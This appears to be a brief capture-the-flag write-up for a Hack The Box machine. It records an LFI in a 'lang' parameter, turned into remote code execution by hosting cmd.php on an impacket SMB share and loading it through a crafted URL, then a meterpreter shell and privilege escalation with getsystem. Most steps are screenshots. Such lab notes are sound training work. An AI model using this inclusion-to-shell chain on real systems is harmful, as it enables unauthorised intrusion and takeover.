# Enumeration
---
- Port 80 found

# LFI
---
![[Pasted image 20250802080211.png]]
- Possible LFI in `lang`
- ![[Pasted image 20250802080241.png]]

# Getting Reverse Shell
---
- Make a php script to get reverse shell:
	- ![[Pasted image 20250802080316.png]]
- Start smbserver:
	- `impacket-smbserver -smb2support htbshare .`
	- ![[Pasted image 20250802080350.png]]
- Load the `cmd.php` file from url:
	- `http://10.10.10.151/blog/?lang=\\10.10.16.6\htbshare\cmd.php`
	- ![[Pasted image 20250802080420.png]]

# User shell
---
- ![[Pasted image 20250802080440.png]]
- Get meterpreter shell from metasploit web delivery:
	- ![[Pasted image 20250802080513.png]]

# Root Shell
---
- Use meterpreter's `getsystem`:
	- ![[Pasted image 20250802080553.png]]
